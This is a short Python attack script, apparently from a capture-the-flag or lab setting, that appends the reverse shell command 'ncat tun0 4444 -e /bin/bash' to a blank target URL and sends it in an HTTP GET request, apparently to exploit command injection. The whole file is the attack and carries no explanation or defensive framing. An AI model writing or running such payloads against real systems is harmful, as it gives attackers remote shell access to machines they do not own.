import requests

# Target URL
TARGET_URL = ""

# Reverse shell payload
payload = "ncat tun0 4444 -e /bin/bash"

print("[+] Sending reverse shell payload...")

requests.get(TARGET_URL + payload)
